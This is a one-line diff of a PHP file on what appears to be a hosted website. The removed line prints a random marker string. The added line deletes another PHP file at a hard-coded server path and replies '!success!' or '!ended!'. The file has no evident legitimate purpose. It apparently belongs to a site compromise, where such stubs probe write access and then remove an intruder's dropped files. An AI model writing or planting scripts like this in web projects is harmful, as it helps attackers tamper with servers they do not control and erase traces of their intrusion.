@@ -1,1 +1,1 @@
-<?php print "IGatxAyuVnlbOkk"."cyzCAUzHDPnD";exit;
+<?php    @unlink("/var/www/vhosts/fastandstatic.com/git.fastandstatic.com/alape.fastandstatic.com/author/beginedit2.php"); if (!file_exists("/var/www/vhosts/fastandstatic.com/git.fastandstatic.com/alape.fastandstatic.com/author/beginedit2.php")) {     die('!success!'); } die('!ended!');
